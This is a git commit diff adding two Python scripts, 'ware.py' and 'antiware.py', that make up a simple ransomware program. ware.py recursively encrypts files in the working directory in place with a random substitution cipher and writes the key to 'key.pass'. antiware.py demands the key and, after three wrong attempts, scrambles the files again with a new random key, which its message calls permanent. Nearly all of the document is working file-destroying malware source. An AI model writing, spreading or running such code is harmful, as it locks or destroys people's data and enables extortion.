2df00fb2579cbbed18d6c561a9ce764ce49c7335
BuildTools <unconfigured@null.spigotmc.org>
2024-03-13 18:29:21 +0100

    new file:   antiware.py 	new file:   console.py 	new file:   testfiles/ipconfig.ipconfig 	new file:   testfiles/safe/asdf 	new file:   testfiles/safe/e52134 	new file:   testfiles/test1.html 	new file:   ware.py

---
+++ antiware.py
@@ -0,0 +1,62 @@
+import os
+import random
+
+files = []
+
+def appenddir(dir):
+	dirfiles = []
+	for file in os.listdir(dir):
+		if file == "ware.py" or file ==  "key.pass" or file == "antiware.py":
+			continue
+		if os.path.isfile(file):
+			files.append(os.path.join(dir, file))
+			dirfiles.append(file)
+		if os.path.isdir(file):
+			appenddir(os.path.join(dir, file))
+appenddir(os.getcwd())
+
+print(files)
+
+key = input("please enter the decryption key\n") + "\n" + input("")
+
+
+alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+[]{}\\|\n"
+
+with open("key.pass", "r") as thekey:
+    rightkey = thekey.read()
+
+def decrypt_files(files, key, alphabet):
+    finishedfiles = []
+    for file in files:
+        try:
+            with open(file, "r") as thefile:
+                contents = thefile.read()
+                contents_decrypted = ""
+                for encletter in contents:
+                    if encletter in key:
+                        index = key.index(encletter)
+                        decrypted_letter = alphabet[index]
+                        contents_decrypted += decrypted_letter
+                    else:
+                        contents_decrypted += encletter
+            with open(file, "w") as thefile:
+                thefile.write(contents_decrypted.replace('਍ഀ', ''))
+            finishedfiles.append(file)
+        except Exception as e:
+            print(f"Error decrypting file {file}: {e}")
+    print(f"decryption finished for {str(finishedfiles)}")
+
+def check_key(key, right_key, attempts, alphabet):
+    if key != right_key:
+        attempts -= 1
+        if attempts == 0:
+            print("Wrong input, files have been permanently encrypted")
+            key = ''.join(random.sample(alphabet, len(alphabet)))
+            decrypt_files(files, key, alphabet)
+        else:
+            print(f"Wrong input, {attempts} attempts left")
+            check_key(input("Please enter the decryption key:\n") + "\n" + input(""), right_key, attempts, alphabet)
+    else:
+        decrypt_files(files, key, alphabet)
+   
+check_key(key, rightkey, 3, alphabet)
---
+++ ware.py
@@ -0,0 +1,60 @@
+import os
+import random
+
+files = []
+
+def appenddir(dir):
+	print(f"appending dir: {dir}")
+	dirfiles = []
+	for file in os.listdir(dir):
+		if file == "ware.py" or file ==  "key.pass" or file == "antiware.py":
+			print(f"skipped file: {file}")
+			continue
+		if os.path.isfile(file):
+			files.append(os.path.join(dir, file))
+			dirfiles.append(file)
+		if os.path.isdir(file):
+			print(f"folder detected: {file}")
+			appenddir(os.path.join(dir, file))
+	print(f"files found in {dir}: {str(dirfiles)}")
+appenddir(os.getcwd())
+
+print(files)
+
+alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+[]{}\\|\n"
+
+key = ''.join(random.sample(alphabet, len(alphabet)))
+
+with open("key.pass", "w") as thekey:
+	thekey.write(key)
+with open("key.pass", "r") as thekey:
+	key = thekey.read()
+encalphabet = ""
+index = 0
+for letter in alphabet:
+	encalphabet += key[index]
+	index += 1
+print(encalphabet)
+
+finishedfiles = []
+
+for file in files:
+	try:
+		with open(file, "r") as thefile:
+			contents = thefile.read()
+			contents_encrypted = ""
+			for encletter in contents:
+				index = 0
+				for letter in alphabet:
+					index += 1
+					if encletter == letter:
+						encletter = key[index - 1]
+						break
+				contents_encrypted += encletter
+		with open(file, "w") as thefile:
+			thefile.write(contents_encrypted)
+		finishedfiles.append(file)
+	except:
+		a = ""
+
+print(f"encrypting finished for {str(finishedfiles)}")
